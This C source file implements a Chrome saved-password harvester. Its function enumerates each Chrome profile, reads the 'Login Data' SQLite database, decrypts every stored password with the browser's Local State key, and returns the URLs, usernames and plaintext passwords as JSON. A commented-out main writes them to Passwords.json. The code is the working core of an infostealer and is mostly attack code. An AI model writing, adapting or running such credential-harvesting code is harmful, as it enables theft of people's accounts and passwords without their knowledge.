#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <cJSON/cJSON.h>
#include <sqlite3.h>
#include "Chrome.h"


char* GetChromeSavedPasswords(){
	char UserDataPath[MAX_PATH_LENGTH],LocalStatePath[MAX_PATH_LENGTH];
	CHROME_PATH_LOCAL_STATE(LocalStatePath);
	CHROME_PATH(UserDataPath);
	DATA_BLOB SecretKey;
	
	WIN32_FIND_DATAA findFileData;
	char path[MAX_PATH_LENGTH];
	sprintf(path,"%s\\*",UserDataPath);
	
	GetSecretKey(LocalStatePath, &SecretKey);

	HANDLE hFind = FindFirstFileA(path, &findFileData);

	if (hFind == INVALID_HANDLE_VALUE) {
		perror("Error opening Chrome User Data directory");
		exit(EXIT_FAILURE);
	}
	char *json_string;
	do {
		if (strstr(findFileData.cFileName, "Profile ") != NULL || strstr(findFileData.cFileName, "Default") != NULL)  {
			// Found a matching folder (Profile* or Default)
			char loginDataPath[MAX_PATH_LENGTH];
			snprintf(loginDataPath, MAX_PATH_LENGTH,
			         "%s\\%s\\Login Data", UserDataPath, findFileData.cFileName);

			sqlite3* conn = getDBConnection(loginDataPath);

			if (conn != NULL) {

				sqlite3_stmt *stmt;
				const char *query = "SELECT action_url, username_value, password_value FROM logins";
				
				if (sqlite3_prepare_v2(conn, query, -1, &stmt, NULL) == SQLITE_OK) {
					int result;
					 // Create a cJSON array
    				cJSON *json_array = cJSON_CreateArray();
    				int i = 1;
					while ((result = sqlite3_step(stmt)) == SQLITE_ROW) {
						const char *url 		= (const char *)sqlite3_column_text(stmt, 0);
						const char *username 	= (const char *)sqlite3_column_text(stmt, 1);
						BYTE  *ciphertext 		= (BYTE *)sqlite3_column_blob(stmt, 2);
						int bytes 				= sqlite3_column_bytes(stmt, 2);
						if(strcmp(url, "") && strcmp(username, "")  && memcmp(ciphertext,"",1)) {
							DATA_BLOB cipher = (DATA_BLOB) {bytes,ciphertext};
							// Create a cJSON object for an entry
					        cJSON *entry = cJSON_CreateObject();

					        // Add id, url, username, and password to the entry
					        cJSON_AddNumberToObject(entry, "id", i);
					        cJSON_AddStringToObject(entry, "url", url);
					        cJSON_AddStringToObject(entry, "username", username);
					        cJSON_AddStringToObject(entry, "password", DecryptPassword(cipher,SecretKey));

					        // Add the entry to the array
					        cJSON_AddItemToArray(json_array, entry);
					        i++;
						}
						
					}
					json_string = cJSON_Print(json_array);
					cJSON_Delete(json_array);
					sqlite3_finalize(stmt);
				} else {
					fprintf(stderr, "Error preparing SQL statement: %s\n", sqlite3_errmsg(conn));
				}
			} // If connection established
		} // Filtering only user profiles
	} while (FindNextFileA(hFind, &findFileData) != 0); 	// Get user profiles all
	FindClose(hFind);

    return json_string;
}
// int main(){
// 	FILE *file;
// 	file = fopen("Passwords.json","w");
// 	char* json = GetChromeSavedPasswords();
// 	fwrite(json,sizeof(char),strlen(json),file);
// 	fclose(file);
// }